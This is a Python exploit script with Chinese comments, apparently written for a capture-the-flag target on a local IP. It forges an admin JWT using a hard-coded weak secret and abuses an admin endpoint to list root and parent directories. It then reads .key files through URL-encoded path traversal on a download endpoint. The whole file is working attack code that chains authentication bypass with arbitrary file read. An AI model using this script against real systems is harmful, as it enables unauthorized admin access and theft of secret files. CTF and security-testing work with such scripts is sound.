#!/usr/bin/env python3
"""
列出应用根目录的父目录，寻找key文件
"""

import requests
import jwt
import json
from datetime import datetime, timedelta, timezone

BASE_URL = "http://192.168.18.25:25004"
JWT_SECRET = "secret-secret-secret-secret-secret-secret-secret-secret-secret-secret-secret"

def create_admin_session():
    """创建admin session"""
    payload = {
        "sub": "admin",
        "exp": datetime.now(timezone.utc) + timedelta(minutes=30)
    }
    
    token = jwt.encode(payload, JWT_SECRET, algorithm="HS512")
    session = requests.Session()
    session.cookies.set("jwt", token)
    return session

def set_and_list_dir(session, path):
    """设置resourceDir并列出文件"""
    # 1. 设置resourceDir
    print(f"\n[*] 设置resourceDir: {path}")
    r = session.post(
        f"{BASE_URL}/admin/challengeResourceDir",
        data={"new-path": path}
    )
    
    if r.status_code != 200:
        print(f"[!] 设置失败: {r.status_code}")
        return []
    
    # 2. 列出文件
    print(f"[*] 列出文件...")
    r = session.get(f"{BASE_URL}/dashboard/list")
    
    if r.status_code == 200:
        try:
            files = r.json()
            print(f"[+] 找到 {len(files)} 个文件:")
            for f in files:
                print(f"    - {f}")
            return files
        except:
            print(f"[!] 解析JSON失败: {r.text[:200]}")
            return []
    else:
        print(f"[!] 列出失败: {r.status_code}")
        return []

def read_file_via_path_traversal(session, remote_path):
    """通过路径遍历读取文件"""
    encoded_path = remote_path.replace('/', '%2f')
    url = f"{BASE_URL}/download?path=uploads%2f..%2f{encoded_path}"
    
    print(f"\n[*] 读取文件: {remote_path}")
    print(f"    URL: {url}")
    
    r = session.get(url)
    if r.status_code == 200:
        print(f"[+] 成功! 内容长度: {len(r.content)} bytes")
        return r.text
    else:
        print(f"[!] 失败: {r.status_code}")
        return None

def main():
    session = create_admin_session()
    
    # 尝试不同的父目录路径
    paths_to_try = [
        "..",          # 上一级
        "../..",       # 上两级  
        "../../..",    # 上三级
        "/",           # 根目录
        "/tmp",        # tmp目录
        "/var",        # var目录
    ]
    
    all_key_files = []
    
    for path in paths_to_try:
        files = set_and_list_dir(session, path)
        
        # 查找.key文件
        key_files = [f for f in files if f.endswith('.key')]
        if key_files:
            print(f"\n[!!!] 在 {path} 找到key文件: {key_files}")
            all_key_files.extend([(path, f) for f in key_files])
    
    # 尝试读取找到的key文件
    if all_key_files:
        print(f"\n[*] 总共找到 {len(all_key_files)} 个.key文件")
        for base_path, filename in all_key_files:
            full_path = f"{base_path}/{filename}".replace('//', '/')
            content = read_file_via_path_traversal(session, full_path)
            
            if content:
                print(f"\n[+] {filename} 内容:")
                print(f"    {content}")
                
                # 保存
                safe_name = filename.replace('/', '_').replace('\\', '_')
                with open(safe_name, 'w') as f:
                    f.write(content)
                print(f"[+] 已保存到 {safe_name}")
    else:
        print("\n[!] 未找到.key文件")
        print("[*] 尝试直接读取已知的key文件名...")
        
        # 根据BackUpServlet.class，key文件名是 ﾎﾝ.key
        for path in ["../ﾎﾝ.key", "../../ﾎﾝ.key", "../../../ﾎﾝ.key"]:
            content = read_file_via_path_traversal(session, path)
            if content:
                print(f"[+] 找到key: {content}")
                break

if __name__ == "__main__":
    main()
